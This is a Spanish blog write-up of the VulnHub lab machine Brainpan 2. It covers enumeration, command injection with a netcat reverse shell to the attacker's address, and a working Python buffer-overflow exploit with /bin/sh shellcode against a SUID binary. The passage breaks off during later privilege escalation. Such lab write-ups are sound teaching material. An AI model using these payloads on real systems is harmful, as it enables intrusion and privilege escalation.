<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width initial-scale=1" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="robots" content="noindex">

  <title>Writeup VulnHub Brainpan 2</title>

  <meta name="description" content="Resolución de la máquina Brainpan 2 de la plataforma de VulnHub">
  <meta name="author" content="xchg2pwn">
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Writeup VulnHub Brainpan 2">
  <meta name="twitter:description" content="Resolución de la máquina Brainpan 2 de la plataforma de VulnHub">
  <meta name="twitter:creator" content="xchg2pwn">  
  <meta name="twitter:image" content="/images/otros/vulnhub.png" />

  <meta property="og:site_name" content="xchg2pwn" />
  <meta property="og:type" content="article">
  <meta property="og:title" content="Writeup VulnHub Brainpan 2">
  <meta property="og:description" content="Resolución de la máquina Brainpan 2 de la plataforma de VulnHub">
  <meta property="og:image" content="/images/otros/vulnhub.png" />

  <link rel="manifest" href="/images/favicons/manifest.json">
  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/otros/vulnhub.png">

  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">
  
  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">

  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
  <link rel="alternate" type="application/rss+xml" title="Writeup VulnHub Brainpan 2" href="/feed.xml">
</head>

  <body style="background-color: #282828;">
  
    <span class="mobile btn-mobile-menu">
      <i class="icon icon-list btn-mobile-menu__icon"></i>
      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
    </span>

<header class="panel-cover" style="background-image: url(/images/cover.jpg)">

  <div class="panel-main">
    <div class="panel-main__inner panel-inverted">
      <div class="panel-main__content">

          <img src="/images/profile.jpg" class="user-image zoomable" alt="xchg2pwn">
          <h1 class="panel-cover__title panel-title scale-up-center">xchg2pwn</h1>

        <hr class="panel-cover__divider">
        <p class="panel-cover__description slide-top">Entusiasta del reversing y desarrollo de exploits</p>
        <hr class="panel-cover__divider panel-cover__divider--secondary">

        <div class="navigation-wrapper">
         <nav class="cover-navigation cover-navigation--primary">
            <ul class="navigation">
              <li class="navigation__item grow"><a href="/vulnhub" title="xchg2pwn" class="blog-button">VulnHub</a></li>
            </ul>
          </nav>

          <nav class="cover-navigation navigation--social">
            <ul class="navigation">

              <li class="navigation__item grow">
                <a href="https://github.com/xchg2pwn" title="Github" target="_blank">
                  <i class="icon icon-social-github"></i>
                  <span class="label">GitHub</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://linkedin.com/in/enrique-de-los-santos-694863233" title="Linkedin" target="_blank">
                  <i class="icon icon-social-linkedin"></i>
                  <span class="label">Linkedin</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://instagram.com/xchg2pwn" title="Instagram" target="_blank">
                  <i class="icon icon-social-instagram"></i>
                  <span class="label">Instagram</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://twitter.com/xchg2pwn" title="Twitter" target="_blank">
                  <i class="icon icon-social-twitter"></i>
                  <span class="label">Twitter</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://youtube.com/@xchg2pwn" title="Youtube" target="_blank">
                  <i class="icon icon-social-youtube"></i>
                  <span class="label">Youtube</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="mailto:xchg2pwn@gmail.com" title="Correo Electronico" target="_blank">
                  <i class="icon icon-mail"></i>
                  <span class="label">Email</span>
                </a>
              </li>              

            </ul>
          </nav>
        </div>
      </div>
    </div>

    <div class="panel-cover--overlay"></div>
  </div>
</header>
    <br>
    <div class="content-wrapper">
      <div class="content-wrapper__inner">
        <article class="post-container post-container--single">
    <div class="izquierda">
      <h3 class="post-title">Contenido</h3><br>
      <ul>
        <li><a href="#enumeration">Enumeración</a></li>
        <li><a href="#shell-anansi">Shell - anansi</a></li>
        <li><a href="#shell-root">Shell - root</a></li>
        <li><a href="#shell-puck">Shell - puck</a></li>
        <li><a href="#shell-root2">Shell - root 2</a></li>
      </ul>
  </div>

  <header class="post-header slide-top">
    <h4 class="post-title">VulnHub</h4>
    <picture><img src="/images/otros/vulnhub.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
    <h2 class="post-title">Brainpan 2</h2><br>
  </header>
  
<section class="post" id="enumeration">
<br><h3 class="post-title">Enumeración</h3><br>

<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde solo vemos 2 puertos abiertos, <code class="language-plaintext highlighter-rouge">9999</code> y <code class="language-plaintext highlighter-rouge">10000</code> igual que en la maquina <a href="/vulnhub/brainpan1">brainpan 1</a></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ nmap </span><span class="p">192.168.100.5  
Nmap scan report for 192.168.100.5
PORT      STATE    SERVICE
9999/tcp  open     abyss
10000/tcp open     snet-sensor-mgmt</span>
</code></pre></div></div><br>

<p class="plain-text">En la web del puerto <code class="language-plaintext highlighter-rouge">10000</code> encontramos una página sin nada realmente interesante</p>
<a href="/vulnhub/brainpan2/1.png" target="_blank"><div><p><img src="/vulnhub/brainpan2/1.png"></p></div></a>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ wfuzz</span><span class="p"> -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://192.168.100.5:10000/FUZZ -t 100 --hc 404  
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.100.5:10000/FUZZ
Total requests: 4715

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000855:   </span><span class="az">301</span><span class="p">        0 L      0 W        0 Ch        "bin"</span>
</code></pre></div></div><br>

<p class="plain-text">En el directorio <code class="language-plaintext highlighter-rouge">/bin</code> de la web encontramos un archivo llamado <code class="language-plaintext highlighter-rouge">brainpan.exe</code> sin embargo al descargarlo vemos que no es un binario sino una simple <code class="language-plaintext highlighter-rouge">imagen</code></p>
<a href="/vulnhub/brainpan2/2.png" target="_blank"><div><p><img src="/vulnhub/brainpan2/2.png"></p></div></a>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ file </span><span class="p">brainpan.exe
brainpan.exe: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, comment: "CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 85", baseline, precision 8, 381x307, components 3  </span>
</code></pre></div></div><br>

<a href="/vulnhub/brainpan2/3.png" target="_blank"><div><p><img src="/vulnhub/brainpan2/3.png"></p></div></a>

<p class="plain-text">Al conectarnos con netcat al puerto <code class="language-plaintext highlighter-rouge">9999</code> nos devuelve el mismo banner de simplemente <code class="language-plaintext highlighter-rouge">2.0</code>, el programa nos dice que nos autentiquemos como <code class="language-plaintext highlighter-rouge">GUEST</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ netcat </span><span class="p">192.168.100.5 9999
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[______________________ WELCOME TO BRAINPAN 2.0________________________]  
                             LOGIN AS GUEST                             

                          >></span>
</code></pre></div></div><br>

<p class="plain-text">Después de enviar <code class="language-plaintext highlighter-rouge">GUEST</code> nos otorga acceso que nos pide enviar <code class="language-plaintext highlighter-rouge">TELL ME MORE</code> para ver mas opciones, donde encontramos varias que llaman bastante la atencion</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">                          >> GUEST
                          ACCESS GRANTED


                             *  *  *  *                                
    THIS APPLICATION IS WORK IN PROGRESS. GUEST ACCESS IS RESTRICTED.  
    TYPE "TELL ME MORE" FOR A LIST OF COMMANDS.  
                             *  *  *  *                                


                          >> TELL ME MORE
    FILES    HELP    VIEW       CREATE
    USERS    MSG     SYSTEM     BYE

                          >></span>
</code></pre></div></div><br>

</section>
<section class="post" id="shell-anansi">
<br><h3 class="post-title">Shell - anansi</h3><br>

<p class="plain-text">Enviando <code class="language-plaintext highlighter-rouge">FILES</code> podemos ver los archivos como si estuvieramos ejecutando un <code class="language-plaintext highlighter-rouge">ls</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">                          >> FILES
total 36
-rwxr-xr-x 1 root   root   18424 Nov  4  2013 brainpan.exe  
-rw-r--r-- 1 root   root    1109 Nov  5  2013 brainpan.txt  
-rw-r--r-- 1 root   root     683 Nov  4  2013 notes.txt
-rw-r--r-- 1 anansi anansi    12 Nov  5  2013 test-1
-rwxrwxrwx 1 anansi anansi    19 Nov  5  2013 test-2
                          >></span>
</code></pre></div></div><br>

<p class="plain-text">Usando el comando <code class="language-plaintext highlighter-rouge">VIEW</code> nos pide un archivo al cual probablemente hace un <code class="language-plaintext highlighter-rouge">cat</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">                          >> VIEW
    ENTER FILE TO DOWNLOAD: /etc/hosts
127.0.0.1	localhost
127.0.1.1	brainpan2

# The following lines are desirable for IPv6 capable hosts  
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
                          >></span>
</code></pre></div></div><br>

<p class="plain-text">En el archivo a leer enviamos test y adjuntamos un <code class="language-plaintext highlighter-rouge">; id</code> para ejecutar otro comando, en el output podemos ver que ejecuta el comando como el usuario <code class="language-plaintext highlighter-rouge">anansi</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">                          >> VIEW
    ENTER FILE TO DOWNLOAD: test; id
uid=1000(anansi) gid=1000(anansi) groups=1000(anansi),50(staff)  
                          >></span>
</code></pre></div></div><br>

<p class="plain-text">Ya que ejecutamos comandos en <code class="language-plaintext highlighter-rouge">VIEW</code>, nos enviamos una reverse shell con <code class="language-plaintext highlighter-rouge">netcat</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">                          >> VIEW
    ENTER FILE TO DOWNLOAD: test; netcat -e /bin/sh 192.168.100.73 443  </span>
</code></pre></div></div><br>

<p class="plain-text">Al hacerlo recibimos una shell como el usuario <code class="language-plaintext highlighter-rouge">anansi</code> en nuestro listener de netcat que curiosamente pertenece al grupo <code class="language-plaintext highlighter-rouge">staff</code> que por ahora no nos sirve de nada</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
Listening on 0.0.0.0 443
Connection received on 192.168.100.5 
script /dev/null -c bash
</span><span class="ve">anansi@brainpan2</span><span class="p">:</span><span class="az">/opt/brainpan</span><span class="p">$ id
uid=1000(anansi) gid=1000(anansi) groups=1000(anansi),50(staff)  
</span><span class="ve">anansi@brainpan2</span><span class="p">:</span><span class="az">/opt/brainpan</span><span class="p">$ hostname -I
192.168.100.5 
</span><span class="ve">anansi@brainpan2</span><span class="p">:</span><span class="az">/opt/brainpan</span><span class="p">$</span>
</code></pre></div></div><br>

</section>
<section class="post" id="shell-root">
<br><h3 class="post-title">Shell - root</h3><br>

<p class="plain-text">Buscando por ejecutables con privilegios <code class="language-plaintext highlighter-rouge">suid</code> encontramos uno personalizado que llama algo la atención, y es <code class="language-plaintext highlighter-rouge">msg_root</code> el cual pertenece al usuario y grupo root</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">anansi@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$ find / -perm -u+s 2>/dev/null
/usr/sbin/exim4
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/procmail
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/newgrp
/usr/lib/pt_chown
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/bin/umount
/bin/ping
/bin/mount
/bin/ping6
/bin/su
/home/reynard/msg_root
</span><span class="ve">anansi@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$ ls -l /home/reynard/msg_root
-rwsr-xr-x 1 root root 8999 Nov  6  2013 </span><span class="err">/home/reynard/msg_root</span><span class="p">  
</span><span class="ve">anansi@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">El programa pide como argumento un <code class="language-plaintext highlighter-rouge">usuario</code> y un <code class="language-plaintext highlighter-rouge">mensaje</code>, sin embargo incluso pasandole los <code class="language-plaintext highlighter-rouge">argumentos</code> no queda muy claro cual es su funcion o que hace</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">anansi@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$ /home/reynard/msg_root
usage: msg_root username message
</span><span class="ve">anansi@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$ /home/reynard/msg_root username message  
Your message is message
</span><span class="ve">anansi@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Para decompilarlo y analizarlo mejor podemos enviarlo a nuestro equipo con <code class="language-plaintext highlighter-rouge">netcat</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">anansi@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$ netcat 192.168.100.73 4444 < /home/reynard/msg_root  
</span><span class="ve">anansi@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ netcat </span><span class="p">-lvnp 4444 > msg_root
Listening on 0.0.0.0 4444
Connection received on 192.168.100.5  </span>
</code></pre></div></div><br>

<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">ida</code> desensamblamos el binario, la función <code class="language-plaintext highlighter-rouge">main</code> inicia comprobando que la cantidad de argumentos sea mayor a <code class="language-plaintext highlighter-rouge">2</code>, si es asi le pasa los 2 primeros argumentos a la función <code class="language-plaintext highlighter-rouge">get_name</code>, de lo contrario muestra un mensaje de uso con <code class="language-plaintext highlighter-rouge">puts</code> y sale</p>
<a href="/vulnhub/brainpan2/4.png" target="_blank"><div><p><img src="/vulnhub/brainpan2/4.png"></p></div></a>

<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">get_name</code> inicia guardando en una variable un puntero a la función <code class="language-plaintext highlighter-rouge">save_msg</code>, luego toma la longitud del primer argumento y la compara con <code class="language-plaintext highlighter-rouge">0x11</code>, si es mayor usa <code class="language-plaintext highlighter-rouge">strncpy</code> para copiar <code class="language-plaintext highlighter-rouge">0x12</code> bytes a un buffer, si es menor o igual usa <code class="language-plaintext highlighter-rouge">strcpy</code> sin ninguna sanitización para copiar a un buffer en <code class="language-plaintext highlighter-rouge">ebp -  12</code>, resumiendo tenemos un Buffer Overflow pero con una limitación de <code class="language-plaintext highlighter-rouge">0x12</code> o <code class="language-plaintext highlighter-rouge">18</code> bytes</p>
<a href="/vulnhub/brainpan2/5.png" target="_blank"><div><p><img src="/vulnhub/brainpan2/5.png"></p></div></a>

<p class="plain-text">Sin importar el camino que tome luego reserva un espacio en memoria de <code class="language-plaintext highlighter-rouge">2000</code> bytes con <code class="language-plaintext highlighter-rouge">malloc</code> y almacena el segundo argumento en ese espacio que se supone es el mensaje, luego guarda en <code class="language-plaintext highlighter-rouge">eax</code> el puntero a <code class="language-plaintext highlighter-rouge">save_msg</code> y lo llama con un <code class="language-plaintext highlighter-rouge">call eax</code></p>
<a href="/vulnhub/brainpan2/6.png" target="_blank"><div><p><img src="/vulnhub/brainpan2/6.png"></p></div></a>

<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">save_msg</code> muestra el mensaje con <code class="language-plaintext highlighter-rouge">printf</code> y escribe el usuario y el mensaje en el archivo <code class="language-plaintext highlighter-rouge">/tmp/msg.txt</code> utilizando <code class="language-plaintext highlighter-rouge">fprintf</code>, podemos comprobarlo leyendolo</p>
<a href="/vulnhub/brainpan2/7.png" target="_blank"><div><p><img src="/vulnhub/brainpan2/7.png"></p></div></a>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">anansi@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat /tmp/msg.txt  
username: message
</span><span class="ve">anansi@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Antes de explotar el <code class="language-plaintext highlighter-rouge">Buffer Overflow</code> podemos ver las protecciones del binario con <code class="language-plaintext highlighter-rouge">checksec</code>, no tiene ninguna habilitada lo que facilitara bastante la explotacion</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ checksec </span><span class="p">msg_root
[</span><span class="az">*</span><span class="p">] '/home/user/msg_root'
    Arch:     i386-32-little
    RELRO:    </span><span class="ro">No RELRO</span><span class="p">
    Stack:    </span><span class="ro">No canary found</span><span class="p">
    NX:       </span><span class="ro">NX disabled</span><span class="p">
    PIE:      </span><span class="ro">No PIE (0x8048000)</span><span class="p">  
    RWX:      </span><span class="ro">Has RWX segments</span>
</code></pre></div></div><br>

<p class="plain-text">Ya que el máximo de bytes es de <code class="language-plaintext highlighter-rouge">18</code>, enviaremos <code class="language-plaintext highlighter-rouge">14 A's</code> y <code class="language-plaintext highlighter-rouge">4 B's</code> en el primer argumento, en el segundo enviamos <code class="language-plaintext highlighter-rouge">8 C's</code>, cuando corrompe el return address se sobrescribe con las <code class="language-plaintext highlighter-rouge">B's</code>, tenemos un problema, ya usamos el máximo de bytes asi que no podemos guardar datos en el stack, además el return value en <code class="language-plaintext highlighter-rouge">eax</code> no es un puntero al buffer sino el propio return address por lo que el <code class="language-plaintext highlighter-rouge">ret2reg</code> no funcionará</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ gdb</span><span class="p"> -q msg_root
Reading symbols from </span><span class="ve">msg_root</span><span class="p">...
</span><span class="ro">pwndbg> </span><span class="p">cyclic 20
aaaabaaacaaadaaaeaaa
</span><span class="ro">pwndbg> </span><span class="p">run AAAAAAAAAAAAAABBBB CCCCCCCC
Starting program: </span><span class="ve">/home/user/msg_root </span><span class="p">AAAAAAAAAAAAAABBBB CCCCCCCC
Using host libthread_db library "</span><span class="ve">/lib/x86_64-linux-gnu/libthread_db.so.1</span><span class="p">".  

Program received signal SIGSEGV, Segmentation fault.
</span><span class="az">0x42424242 </span><span class="p">in</span><span class="am"> ??</span><span class="p"> ()
</span><span class="ro">pwndbg></span><span class="p"> p/x $eip
</span><span class="az">$1</span><span class="p"> = 0x42424242
</span><span class="ro">pwndbg></span><span class="p"> p/x $eax
</span><span class="az">$2</span><span class="p"> = 0x42424242</span>
</span><span class="ro">pwndbg></span>
</code></pre></div></div><br>

<p class="plain-text">Si buscamos las <code class="language-plaintext highlighter-rouge">8 C's</code> podemos ver que aparecen 2 resultados, el primero en alguna parte del stack sin embargo la dirección es aleatoria, la otra coincidencia es en el <code class="language-plaintext highlighter-rouge">heap</code>, y al ser parte del propio binario y no tener la protección <code class="language-plaintext highlighter-rouge">PIE</code> deberia ser una dirección estática, además los permisos en este segmento son <code class="language-plaintext highlighter-rouge">rwx</code> asi que podemos simplemente saltar ahí ejecutar un shellcode que nos devuelva una <code class="language-plaintext highlighter-rouge">/bin/sh</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">pwndbg><span class="p"> search CCCCCCCC
Searching for value: 'CCCCCCCC'
<span class="az">[heap]          0x804a008 <span class="p">'CCCCCCCC'
<span class="am">[stack]         0xffffd784 <span class="p">'CCCCCCCC'
</span><span class="ro">pwndbg></span><span class="p"> vmmap heap
LEGEND: </span><span class="am">STACK</span><span class="p"> | </span><span class="az">HEAP</span><span class="p"> | </span><span class="ro">CODE</span><span class="p"> | </span><span class="sa">DATA</span><span class="p"> | </span><span class="ro">WX</span><span class="p"> | RODATA
     Start        End Perm     Size Offset File
 </span><span class="sa">0x8049000  0x804a000 rw-p     1000   2000 /home/user/msg_root</span><span class="p">
</span><span class="az">►0x804a000  0x806c000 rw-p    22000      0 [heap] +0x1a0</span><span class="p">
</span><span class="p">0xf7e75000 0xf7fd1000 r-xp   15c000      0 /home/user/libc.so.6</span><span class="p">  
</span><span class="ro">pwndbg></span>
</code></pre></div></div><br>

<p class="plain-text">Podemos verlo de forma mas descriptiva con el comando <code class="language-plaintext highlighter-rouge">heap</code>, el segundo chunk es de <code class="language-plaintext highlighter-rouge">0x7e1</code> o <code class="language-plaintext highlighter-rouge">2000</code> bytes que fue lo que vimos desde ida que se asignó con <code class="language-plaintext highlighter-rouge">malloc</code> para el mensaje, si miramos el chunk con <code class="language-plaintext highlighter-rouge">vis</code> podemos ver que después del dword de tamaño aparece nuestra data del segundo argumento en la dirección <code class="language-plaintext highlighter-rouge">0x804a008</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">pwndbg></span><span class="p"> heap
</span><span class="am">Allocated chunk </span><span class="p">|</span><span class="am"> PREV_INUSE</span><span class="p">
Addr:</span><span class="az"> 0x8049e70</span><span class="p">
Size: 0x190 (with flag bits: 0x191)

</span><span class="am">Allocated chunk</span><span class="p"> |</span><span class="am"> PREV_INUSE</span><span class="p">
Addr:</span><span class="az"> 0x804a000</span><span class="p">
Size: 0x7e0 (with flag bits: 0x7e1)

</span><span class="ro">Top chunk</span><span class="p"> |</span><span class="am"> PREV_INUSE</span><span class="p">
Addr:</span><span class="az"> 0x804a7e0</span><span class="p">
Size: 0x21688 (with flag bits: 0x21689)

</span><span class="ro">pwndbg></span><span class="p"> vis 0x804a198
0x804a000</span><span class="am">	0x00000000</span><span class="az">	0x000007e1	........</span><span class="p">
0x804a008</span><span class="az">	0x43434343	0x43434343	CCCCCCCC</span><span class="p">
0x804a010</span><span class="az">	0x00000000	0x00000000	........</span><span class="p">
---------</span><span class="az">	----------	----------	........</span><span class="p">
0x804a7d8</span><span class="az">	0x00000000	0x00000000	........</span><span class="p">
0x804a7e0</span><span class="az">	0x00000000	</span><span class="sa">0x00021689</span><span class="p">	........	</span><span class="p"> &lt-- Top chunk
</span><span class="ro">pwndbg></span>
</code></pre></div></div><br>

<p class="plain-text">Entonces iniciamos el exploit, nuestro payload del primer argumento sera rellenar con <code class="language-plaintext highlighter-rouge">A's</code> hasta el return address y en el saltaremos a la dirección en el <code class="language-plaintext highlighter-rouge">heap</code> donde se guarda nuestro segundo argumento y como en el segundo argumento enviamos un <a href="https://github.com/xchg2pwn/BinaryExploitation/blob/main/shellcode/bin_sh.asm">shellcode</a> que nos ejecuta una <code class="language-plaintext highlighter-rouge">/bin/sh</code> el programa nos deberia devolver una shell</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python2
</span><span class="o">import</span><span class="p"> struct

p32</span><span class="o"> = lambda</span><span class="am"> addr</span><span class="p">: struct.pack(</span><span class="s">"&lti"</span><span class="p">, addr)

shellcode</span><span class="o"> =</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x6a\x0b\x58\x6a\x68\x66\x68\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x99\xcd\x80</span><span class="s">"  </span><span class="p">

offset</span><span class="o"> =</span><span class="mi"> 14</span><span class="p">
junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> offset

payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> junk
payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x804a008</span><span class="p">)
payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">" "</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> shellcode

</span><span class="no">print</span><span class="p">(payload)</span>
</code></pre></div></div><br>

<p class="plain-text">Al ejecutar el exploit podemos ver que se ejecuta el shellcode y nos devuelve una shell como el usuario propietario del binario que en este caso era el usuario <code class="language-plaintext highlighter-rouge">root</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">anansi@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$ /home/reynard/msg_root $(python2 exploit.py)  
$ whoami
root
$ hostname -I
192.168.100.5 
$</span>
</code></pre></div></div><br>

</section>
<section class="post" id="shell-puck">
<br><h3 class="post-title">Shell - puck</h3><br>

<p class="plain-text">Si intentamos leer la flag en el directorio <code class="language-plaintext highlighter-rouge">/root</code> nos devuelve permiso denegado y el archivo <code class="language-plaintext highlighter-rouge">whatif.txt</code> nos confirma con un mensaje que aun no somos el usuario <code class="language-plaintext highlighter-rouge">root</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">$ cd /root
$ ls -l
-rw------- 1 root  root  461 Nov  5  2013 flag.txt  
-rw------- 1 root  root  245 Nov  5  2013 whatif.txt  
$ cat flag.txt
cat: flag.txt: Permission denied
$ cat whatif.txt

       WHAT IF I TOLD YOU
              ___
            /     \ 
           | ______\
          (, \_/ \_/
           |   ._. |
           \   --- /
           /`-.__.'
      .---'`-.___|\___
     /                `.

       YOU ARE NOT ROOT?

$</span>
</code></pre></div></div><br>

<p class="plain-text">Filtrando por la cadena root en el archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code> podemos encontrar a 2 usuarios <code class="language-plaintext highlighter-rouge">root</code> con el id <code class="language-plaintext highlighter-rouge">104</code> y <code class="language-plaintext highlighter-rouge">root </code> con un espacio que es el id <code class="language-plaintext highlighter-rouge">0</code> que queremos</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">$ grep root /etc/passwd
root:x:104:106:root:/root:/bin/bash  
root :x:0:0:root:/var/root:/bin/bash  
$</span>
</code></pre></div></div><br>

<p class="plain-text">Para evitar conflictos, con python haremos que nuestro <code class="language-plaintext highlighter-rouge">uid</code> y <code class="language-plaintext highlighter-rouge">gid</code> sea igual a <code class="language-plaintext highlighter-rouge">104</code>, despues nos lanzamos una <code class="language-plaintext highlighter-rouge">bash</code> que puede llegar a ser un poco mas interactiva</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">$ python2
Python 2.7.3
>>> </span><span class="p">import </span><span class="p">os
>>> os.setreuid(</span><span class="p">104</span><span class="p">, </span><span class="p">104</span><span class="p">)
>>> os.system(</span><span class="p">"bash"</span><span class="p">)
</span><span class="ve">root@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$ whoami
root
</span><span class="ve">root@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$ hostname -I  
192.168.100.5 
</span><span class="ve">root@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Volvemos a listar binarios con privilegios <code class="language-plaintext highlighter-rouge">suid</code>, y encontramos un <code class="language-plaintext highlighter-rouge">brainpan-1.8.exe</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">root@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$ find / -perm -u+s 2>/dev/null  
/opt/old/brainpan-1.8/brainpan-1.8.exe
/usr/sbin/exim4
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/procmail
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/newgrp
/usr/lib/pt_chown
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/bin/umount
/bin/ping
/bin/mount
/bin/ping6
/bin/su
/home/reynard/msg_root
</span><span class="ve">root@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">El binario pertenece al usuario <code class="language-plaintext highlighter-rouge">puck</code>, en ese directorio tambien existe un archivo <code class="language-plaintext highlighter-rouge">brainpan.cfg</code> en el cual cualquier usuario permisos <code class="language-plaintext highlighter-rouge">rw-</code> por lo que puede escribir</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">root@brainpan2</span><span class="p">:</span><span class="az">/opt/old/brainpan-1.8</span><span class="p">$ ls -l
-rwsr-xr-x 1 puck puck  17734 Nov  4  2013 </span><span class="err">brainpan-1.8.exe</span><span class="p">  
-rw-r--r-- 1 puck puck   1227 Nov  5  2013 brainpan.7
-rw-rw-rw- 1 puck staff    25 Jul 25 16:13 brainpan.cfg
